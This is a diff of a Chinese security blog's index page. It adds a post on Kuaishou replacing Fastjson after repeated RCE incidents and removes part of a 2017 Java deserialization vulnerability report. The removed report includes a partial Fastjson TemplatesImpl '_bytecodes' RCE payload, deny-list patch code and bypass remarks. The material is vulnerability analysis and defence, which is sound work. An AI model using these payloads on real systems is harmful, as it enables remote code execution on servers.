@@ -334,6 +334,180 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2020/11/22/看快手如何干掉Fastjson/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="廖新喜">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxlegend">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2020/11/22/看快手如何干掉Fastjson/" itemprop="url">
+                  看快手如何干掉Fastjson
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-11-22T22:49:00+08:00">
+                2020-11-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Fastjson/" itemprop="url" rel="index">
+                    <span itemprop="name">Fastjson</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2020/11/22/看快手如何干掉Fastjson/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2020/11/22/看快手如何干掉Fastjson/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2020/11/22/看快手如何干掉Fastjson/" class="leancloud_visitors" data-flag-title="看快手如何干掉Fastjson">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>#看快手如何干掉Fastjson</p>
+<p>##1.Fastjson 漏洞史<br>文章从公众号转移过来，在博客上做个记录。<br>Fastjson是一个阿里巴巴开发的java高性能JSON库，应用范围非常广，在github上star数已经超过2.2万。从2017年1月份到现在，Fastjson 已出现三次无任何条件限制的的远程代码执行（RCE）漏洞，在其中两次版本更新中，Fastjson官方在知情的情况下从未披露其更新涉及到漏洞，导致这些漏洞以0day在野，有的长达一年之久。另外其涉及到远程代码执行漏洞更新已有10多次，小编也做过好几次贡献，业内苦Fastjson 久已。下图是一个四哥给的调侃：<br><img src="/images/fastjson-0.png" alt="0"><br>四哥给的调侃真的只是调侃吗？下面我们来具体看下Fastjson的更新历史：<br><img src="/images/fastjson-1.png" alt="1"><br>画红框框的都修复了无任何限制的RCE漏洞，并且前两次中都没提到一个漏洞字眼，可想而知，根本就没把漏洞当做一回事，更谈不上CVE等漏洞管理跟踪措施。</p>
+<p>2.快手Fastjson应急那些事<br>Fastjson使用非常广泛，在各大互联网公司各大框架中都有涉及。在 2019 年，快手因为 Fastjson 发起两次应急响应，分别是针对Fastjson-1.2.48版本的漏洞应急和Fastjson-1.2.60版本的漏洞应急。<br>在第一次应急中，由于该漏洞是无任何限制的RCE 0day，我们验证完PoC之后，就推动主站自查，在24小时内完成了升级。漏洞很严重，当时内部有些研发可能感知没那么清楚，为了产生更大的威慑力，我们在某个业务站点getshell，截了几张大大的getshell图丢到大群里，大家的动作立马快速了很多。主站主要靠人找服务就完成了升级，但是其他业务去找到所有存量还是有一定挑战的。下面是我们当时做的一些事情：<br>1.扫描器构造PoC发动扫描，安全组编写了Fastjson的扫描插件，对公司所有站点发起了扫描，还真发现一个漏洞。<br>2.利用快手代码搜索平台搜索代码仓库，当时还没有第三方库平台，惭愧。<br>3.从制品库搜索，解压了所有jar包，搜索相应代码，找出相应责任人。<br>第二次应急是针对Fastjson-1.2.60版本的，有了第一次的经验，从容了一些，搞定PoC，快速推动业务升级即可。<br>在2020年5 月末 Fastjson 又出 超级RCE 0day，各个安全团队都是焦头烂额，快手安全组从容了很多，我们只剩下个位数仓库受影响。</p>
+<p>3.形成替代方案<br>在Fastjson-1.2.48和Fastjson-1.2.60版本漏洞的应急中，我们一直在反思，是不是得干掉Fastjson，怎么说服业务干掉Fastjson。对于Fastjson的代码质量，基础架构部有一些研究基础，认为Fastjson代码质量不是很好，这为后续推动Fastjson下线奠定了基础。<br>于是安全组调研了自身封装的Jackson和gson，形成一个初步结论，具体如下表：<br>|  JSON库       | 安全性   |  性能  |   业务适配性 |<br>| ——–   | —–  | :—-:  | —– |<br>| Fastjson     | 1.漏洞通报机制差，0day漏洞满天飞，飞一年半载的不在话下。2.全局安全风险。3.代码质量差，如dos漏洞。4.官方在testcase中泄露漏洞PoC |   强     |适配度佳|<br>| Jackson2.x(xx in KF)        |   1.已自行封装，去除不安全属性；2.漏洞管理机制好，CVE通告；3.从架构上无全局风险   |   自行封装版本加入afterburner，性能强   |自行封装，适配度佳 |<br>| gson        |    基本无安全风险，代码质量高    |  一般  | 需自行评估  |</p>
+<p>4.推动替代<br>有了前面的替代方案，接下来就是推动替代，说实话这真是一个很艰难的任务，对我们的挑战非常大。<br>第一要务是管住增量，目前是在第三方库的引入上未做强制卡点，但是对于Fastjson这种高危库，安全组在白盒扫描器中添加了相应规则，发现有新增的Fastjson，及时提醒业务方不允许使用。另外也在Check-style禁用了Fastjson，这样研发在开发的过程中就会感知到引入了高危的组件。<br>其次是存量Fastjson的替换，和基础架构组对出替代方案，依照业务优先级，优先推动主站等核心业务做替换，这些核心业务本身也很重视安全问题，几方立马就把这个事情推动下去了。这里面的核心挑战就是核心业务核心组件存在Fastjson依赖，第一步得把这里面的依赖给去除，否则其他位置还会间接引入Fastjson依赖。推完核心业务，接着按照类似模式推动对外业务，接着推动对内业务，历时快一年总共推动了不到1000个仓库完成替换。目前已经干掉了95%+Fastjson依赖。<br>对于快手来说，在安全工程师不会被饿死这件事上，fastjson在已经难以做贡献了（小编表示好慌）。</p>
+<p>5.第三方库漏洞管控<br>第一次应急的过程中还在愁怎么找全Fastjson，不管是快手代码搜索平台还是制品库，都存在覆盖面不全的问题。后面为了提升应急速度，特别是这种第三方库漏洞的应急速度，从gitlab拉取了所有第三方库，通过和第三方漏洞库比较，形成了 Java 三方依赖安全检测。<br><img src="/images/fastjson-2.png" alt="2"><br>第三方库漏洞甚至供应链漏洞已经成为不容忽视的一个漏洞形态，我们接下来也会投入更多力量到第三库漏洞管控上，欢迎大家一起交流进步。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+    <! -- 添加微信图标 -->
+    
+      
+    
+    
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2019/04/30/CVE-2019-2725分析/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2001,220 +2175,6 @@ class java.lang.ProcessBuilder</code></p>
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2018/01/25/2017年反序列化漏洞年度报告/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="廖新喜">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xxlegend">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/01/25/2017年反序列化漏洞年度报告/" itemprop="url">
-                  2017年反序列化漏洞年度报告
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-25T11:49:22+08:00">
-                2018-01-25
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Java/" itemprop="url" rel="index">
-                    <span itemprop="name">Java</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2018/01/25/2017年反序列化漏洞年度报告/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2018/01/25/2017年反序列化漏洞年度报告/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2018/01/25/2017年反序列化漏洞年度报告/" class="leancloud_visitors" data-flag-title="2017年反序列化漏洞年度报告">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="2017年反序列化漏洞年度报告"><a href="#2017年反序列化漏洞年度报告" class="headerlink" title="2017年反序列化漏洞年度报告"></a>2017年反序列化漏洞年度报告</h1><p>Jackson,fastjson,XStream,XMLDecoder,WebLogic,反序列化漏洞，年度报告</p>
-<hr>
-<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>2017年OWASP发布了新的十大web漏洞威胁，其中A8:2017就是不安全的反序列化，A9:2017-使用含有已知漏洞的组件也和反序列化紧密相连，这是因为在Java开发中很多代码都依赖于第三方组件，而这些组件可能会存在反序列漏洞，典型的例子就是Jackson，fastjson，XStream，XMLDecoder等开源组件。绿盟科技NS-SRC 处理的漏洞应急中就有很大一部分是反序列化漏洞，下面我们来一一分析2017年我们应急的那些反序列化漏洞。<br>总得来说，2017年出现的反序列化漏洞和以往反序列漏洞在漏洞形成方式上不太一样，在以往都是由于Java自身的反序列特征导致的漏洞，2017年则多了fastjson，Jackson等，这两个库都能将json文本转换成具体的java bean，在这个转换过程中会导致远程代码执行。<br>本报告重点回顾2017年绿盟科技重点应急，影响面非常广的那些反序列化漏洞。从这个报告中能看出反序列化漏洞的发展，攻击方和防御方不停的对抗过程，bypass和反bypass在这个过程中体现得淋漓尽致。</p>
-<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p><img src="/images/2017_1.png" alt="应急路线图"></p>
-<p>从3月份爆出Fastjson的反序列化特性导致的远程代码执行，四月份则是Jackson，Log4j2，Jenkins的反序列化造成的远程代码执行，接着6月份流出了Weblogic CVE-2017-3248的利用代码。稍微消停了一会，Struts2又被安全研究人员盯上，爆出Struts2-052，又是一个远程代码执行。在11月份，由于Jackson官方对漏洞不敏感，接着又被曝CVE-2017-15095，又一个绕过。进入12月份，Fastjson和Jackson相继发布了几个补丁修复那些黑名单的绕过；Weblogic XMLDecoder(CVE-2017-10352)的漏洞被广泛应用于于挖坑。由于很多漏洞都是远程代码执行，有的一个HTTP POST请求就能getshell，所以备受黑产亲睐。</p>
-<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="1-fastjson反序列化漏洞"><a href="#1-fastjson反序列化漏洞" class="headerlink" title="1 fastjson反序列化漏洞"></a>1 fastjson反序列化漏洞</h2><p>2017年3月15日，fastjson官方发布安全公告表示fastjson在1.2.24及之前版本存在远程代码执行高危安全漏洞。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。fastjson官方建议直接升级到1.2.28/1.2.29或者更新版本来保证系统安全。4月29日，本文作者（xxlegend）构造出了Fastjson的反序列漏洞的PoC，引起了安全圈的广泛讨论。详细的分析可参照<a href="http://blog.nsfocus.net/fastjson-remote-deserialization-program-validation-analysis/" target="_blank" rel="external">1</a>，下面做简单的回顾。</p>
-<h3 id="1-1-补丁"><a href="#1-1-补丁" class="headerlink" title="1.1 补丁"></a>1.1 补丁</h3><p>在ParserConfig.java中添加了checkAutoType，不论用户是否开启了autoTypeSupport功能，在类名被加载时都需要通过额外的一层处理（来判断是否在acceptlist里），只有满足了此限制的类名才会被加载。另外引入了黑名单机制，在开启了autoTypeSupport的情况下，如果加载的是黑名单中类也会抛出异常。补丁核心代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</div><div class="line">        <span class="keyword">if</span> (typeName == <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (typeName.length() &gt;= maxTypeNameLength) &#123;</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">final</span> String className = typeName.replace(<span class="string">'$'</span>, <span class="string">'.'</span>);</div><div class="line">        <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</div><div class="line">                String accept = acceptList[i];</div><div class="line">                <span class="keyword">if</span> (className.startsWith(accept)) &#123;</div><div class="line">                    <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</div><div class="line">                String deny = denyList[i];</div><div class="line">                <span class="keyword">if</span> (className.startsWith(deny)) &#123;</div><div class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</div><div class="line">        <span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</div><div class="line">            clazz = deserializers.findClass(typeName);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</div><div class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">return</span> clazz;</div><div class="line">        &#125;</div></pre></td></tr></table></figure></p>
-<h3 id="1-2-初略分析"><a href="#1-2-初略分析" class="headerlink" title="1.2 初略分析"></a>1.2 初略分析</h3><p>静态分析得知，要构造一个可用的poc，肯定得引入denyList的库。这里我们就引入com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">final</span> String NASTY_CLASS = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</div><div class="line">       String text1 = <span class="string">"&#123;\"@type\":\""</span> + NASTY_CLASS +</div><div class="line">               <span class="string">"\",\"_bytecodes\":[\""</span>+evilCode+<span class="string">"\"],'_name':'a.b','_tfactory':&#123; &#125;,\"_outputProperties\":&#123; &#125;,"</span> +</div><div class="line">               <span class="string">"\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"&#125;\n"</span>;</div><div class="line">       System.out.println(text1);</div><div class="line">      </div><div class="line">       Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</div></pre></td></tr></table></figure></p>
-<p>最核心的部分是_bytecodes，它是要执行的代码，@type是指定的解析类，fastjson会根据指定类去反序列化得到该类的实例，在默认情况下，fastjson只会反序列化公开的属性和域，而com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl中_bytecodes却是私有属性，_name也是私有域，所以在parseObject的时候需要设置Feature.SupportNonPublicField，这样_bytecodes字段才会被反序列化。_tfactory这个字段在TemplatesImpl既没有get方法也没有set方法，这没关系，我们设置_tfactory为{ },fastjson会调用其无参构造函数得_tfactory对象，这样就解决了某些版本中在defineTransletClasses()用到会引用_tfactory属性导致异常退出。整个PoC的执行过程的调用栈如下:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">JSON.parseObject</div><div class="line">...</div><div class="line">JavaBeanDeserializer.deserialze</div><div class="line">...</div><div class="line">FieldDeserializer.setValue</div><div class="line">...</div><div class="line">TemplatesImpl.getOutputProperties</div><div class="line">TemplatesImpl.newTransformer</div><div class="line">TemplatesImpl.getTransletInstance</div><div class="line">...</div><div class="line">Runtime.getRuntime().exec</div></pre></td></tr></table></figure></p>
-<p>更多的原理分析可见<a href="http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/">2</a> 。</p>
-<h3 id="1-3-后续官方修补"><a href="#1-3-后续官方修补" class="headerlink" title="1.3 后续官方修补"></a>1.3 后续官方修补</h3><p>fastjson官方后续又添加了一些补丁，本文作者给fastjson官方提交了两次绕过，fastjson官方都发布了相应更新。具体如下：</p>
-<ol>
-<li>fastjson-1.2.34版本发布，当autoType=true时增强安全防护</li>
-<li>fastjson-1.2.42版本发布 Bug修复安全加固</li>
-<li>fastjson-1.2.43版本发布 Bug修复安全加固</li>
-<li>fastjson-1.2.44版本发布 Bug修复安全加固</li>
-</ol>
-<p>在fastjson-1.2.42版本中通过异或操作混淆了其黑名单，可以阻挡一部分人分析其黑名单内容，其实这是自欺欺人的。具体的黑名单分析读者可以自行研究。</p>
-<h2 id="2-Jackson反序列化"><a href="#2-Jackson反序列化" class="headerlink" title="2 Jackson反序列化"></a>2 Jackson反序列化</h2><p>Jackson是一个开源的Java序列化与反序列化工具，可以将java对象序列化为xml或json格式的字符串，或者反序列化回对应的对象，由于其使用简单，速度较快，且不依靠除JDK外的其他库，被众多用户所使用。但是其组件Jackson-databind可以指定特定的反序列化类，这样就存在代码执行的风险。</p>
-<h3 id="2-1-CVE-2017-7525"><a href="#2-1-CVE-2017-7525" class="headerlink" title="2.1 CVE-2017-7525"></a>2.1 CVE-2017-7525</h3><p>这个CVE是本文作者报告的。下面来看一个Jackson官方的补丁，这个补丁主要是将TemplatesImpl加入了黑名单，从后续的CVE就可以看出这是远远不够的，可以通过各种方式绕过。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">+    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">checkIllegalTypes</span><span class="params">(DeserializationContext ctxt, JavaType type,</span></span></div><div class="line">+            BeanDescription beanDesc)</div><div class="line">+        <span class="keyword">throws</span> JsonMappingException</div><div class="line">+    &#123;</div><div class="line">+        <span class="comment">// There are certain nasty classes that could cause problems, mostly</span></div><div class="line">+        <span class="comment">// via default typing -- catch them here.</span></div><div class="line">+        Class&lt;?&gt; raw = type.getRawClass();</div><div class="line">+        String name = raw.getSimpleName();</div><div class="line">+</div><div class="line">+        <span class="keyword">if</span> (<span class="string">"TemplatesImpl"</span>.equals(name)) &#123; <span class="comment">// [databind#1599]</span></div><div class="line">+            <span class="keyword">if</span> (raw.getName().startsWith(<span class="string">"com.sun.org.apache.xalan"</span>)) &#123;</div><div class="line">+                <span class="keyword">throw</span> JsonMappingException.from(ctxt,</div><div class="line">+                        String.format(<span class="string">"Illegal type (%s) to deserialize: prevented for security reasons"</span>,</div><div class="line">+                                name));</div><div class="line">+            &#125;</div><div class="line">+        &#125;</div><div class="line">+    &#125;</div><div class="line"> &#125;</div></pre></td></tr></table></figure></p>
-<h3 id="2-1-1-分析"><a href="#2-1-1-分析" class="headerlink" title="2.1.1 分析"></a>2.1.1 分析</h3><p>Jackson在反序列的过程中，首先扫描输入的json文件，分析其要反序列的类，通过反射的方式获取该类的构造方法，包括无参构造方法和有参构造方法，获取其setter，getter方法用于操作具体的类的属性。反序列的过程就是先通过反射得到一个实例，通过其setter或者getter方法给该实例的属性赋值，当然如果引入的类的setter方法或者getter方法中存在执行一些一些危险的操作，如利用rmi远程加载类则会造成远程代码执行缺陷。PoC示例图<img src="/images/2017_2.png" alt="Jackson"><br>详细分析可参考<a href="http://blog.nsfocus.net/jackson-framework-java-vulnerability-analysis/" target="_blank" rel="external">3</a>。</p>
-<h3 id="后续官方修补"><a href="#后续官方修补" class="headerlink" title="后续官方修补"></a>后续官方修补</h3><p>CVE-2017-15095是CVE-2017-7525的延续，这个漏洞同样也是本文作者报告的。同样是黑名单的绕过。<br>CVE-2017-17485是CVE-2017-7525的延续，这个漏洞引入的类是<code>org.springframework.context.support.ClassPathXmlApplicationContext</code>,利用这个库的bean重新生成类，而这个bean所依赖的xml是由攻击者来定制的。从这里也可以看出黑名单就是个无底洞，深不可见，bypass也是不完。由于Jackson的特性，可以预测，Jackson在2018年还将出现更多的绕过。</p>
-<h2 id="3-Struts2"><a href="#3-Struts2" class="headerlink" title="3 Struts2"></a>3 Struts2</h2><p>struts2号称漏洞之王，2017应急中就处理了S2-045，S2-046，S2-48，S2-052，S2-055，都是远程代码执行级别的漏洞。S2-045的PoC现在还被黑客用于各种漏洞扫描，挖矿。既然是漏洞之王，那自然少不了反序列化，S2-052（CVE-2017-9805）就是XStream使用不当造成的反序列化。S2-055则是由于Jackson-databind导致的反序列化。这两个漏洞的典型特点都是不恰当的使用第三方库导致的。</p>
-<h3 id="3-1-S2-052分析"><a href="#3-1-S2-052分析" class="headerlink" title="3.1 S2-052分析"></a>3.1 S2-052分析</h3><p>根据官方的描述信息来看，是REST插件使用到XStreamHandler处理xml数据的时候，由于未对xml数据做任何过滤，在进行反序列将xml数据转换成Object时导致的RCE。</p>
-<h4 id="3-1-1-补丁"><a href="#3-1-1-补丁" class="headerlink" title="3.1.1 补丁"></a>3.1.1 补丁</h4><p>补丁的核心部分如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">+    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">addDefaultPermissions</span><span class="params">(ActionInvocation invocation, XStream stream)</span> </span>&#123;</div><div class="line"> +        stream.addPermission(<span class="keyword">new</span> ExplicitTypePermission(<span class="keyword">new</span> Class[]&#123;invocation.getAction().getClass()&#125;));</div><div class="line"> +        <span class="keyword">if</span> (invocation.getAction() <span class="keyword">instanceof</span> ModelDriven) &#123;</div><div class="line"> +            stream.addPermission(<span class="keyword">new</span> ExplicitTypePermission(<span class="keyword">new</span> Class[]&#123;((ModelDriven) invocation.getAction()).getModel().getClass()&#125;));</div><div class="line"> +        &#125;</div><div class="line"> +        stream.addPermission(NullPermission.NULL);</div><div class="line"> +        stream.addPermission(PrimitiveTypePermission.PRIMITIVES);</div><div class="line"> +        stream.addPermission(ArrayTypePermission.ARRAYS);</div><div class="line"> +        stream.addPermission(CollectionTypePermission.COLLECTIONS);</div><div class="line"> +        stream.addPermission(<span class="keyword">new</span> ExplicitTypePermission(<span class="keyword">new</span> Class[]&#123;Date.class&#125;));</div><div class="line"> +    &#125;</div></pre></td></tr></table></figure></p>
-<p>主要就是将xml中的数据白名单化，把Collection和Map，一些基础类，时间类放在白名单中，这样就能阻止XStream反序列化的过程中带入一些有害类。</p>
-<h4 id="3-1-2-分析"><a href="#3-1-2-分析" class="headerlink" title="3.1.2 分析"></a>3.1.2 分析</h4><p>首先分析入口文件，在Struts2的配置文件中有如下xml描述信息：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">type</span>=<span class="string">"org.apache.struts2.rest.handler.ContentTypeHandler"</span> <span class="attr">name</span>=<span class="string">"xml"</span> <span class="attr">class</span>=<span class="string">"org.apache.struts2.rest.handler.XStreamHandler"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">"struts.action.extension"</span> <span class="attr">value</span>=<span class="string">"xhtml,,xml,json"</span>/&gt;</span></div></pre></td></tr></table></figure>
-<p>也就是说ContentType为xml的所有请求都会交给XStreamHandler来处理，XStreamHanler.toObject调用了XStream.fromXml来处理那些请求中的xml信息，从而进入反序列化流程。<br>这里面最有意思的应该是官方给的临时缓解措施不起作用，官方给出的缓解措施<code>&lt;constant name=&quot;struts.action.extension&quot; value=&quot;xhtml,,,json&quot; /&gt;</code>，从字面意思也能看出来，这个是针对action的后缀的，也就是说如果后缀不带xml也就可以绕过。而POST请求一般不带xml后缀直接忽视这个缓解措施。下图就是一个示例：<img src="/images/2017_3.png" alt="struts2"><br>所以说Struts的官方也是根据PoC修漏洞，没完全测试过的东西就直接放出来。XStream只跟Content-Type有关，如果Content-Type中含有xml，则会交给XStream处理，更多的详情分析见<a href="http://blog.nsfocus.net/struts2-s2-052-rest-plug-in-remote-code-execution-technical-analysis/" target="_blank" rel="external">4</a></p>
-<h3 id="3-2-S2-055分析"><a href="#3-2-S2-055分析" class="headerlink" title="3.2 S2-055分析"></a>3.2 S2-055分析</h3><p>2017年12月1日，Apache Struts发布最新的安全公告，Apache Struts 2.5.x REST插件存在远程代码执行的中危漏洞，漏洞编号与CVE-2017-7525相关。漏洞的成因是由于使用的Jackson版本过低在进行JSON反序列化的时候没有任何类型过滤导致远程代码执行。当然官方说的影响是未知，其实这里是远程代码执行。</p>
-<h4 id="S2-055补丁"><a href="#S2-055补丁" class="headerlink" title="S2-055补丁"></a>S2-055补丁</h4><p>没有提供补丁，只是提醒升级Jackson库版本。</p>
-<h4 id="S2-055分析"><a href="#S2-055分析" class="headerlink" title="S2-055分析"></a>S2-055分析</h4><p>为了让Jackson支持多态，Jackson官方提供了几种方式，第一种全局Default Typing机制，第二种为相应的class添加@JsonTypeInfo注解。这里会启用第二种方式，在第二种方式中，大体代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@JsonTypeInfo</span>(use = JsonTypeInfo.Id.CLASS, include = JsonTypeInfo.As.WRAPPER_ARRAY)</div><div class="line">    <span class="keyword">public</span> Object clientName;</div></pre></td></tr></table></figure></p>
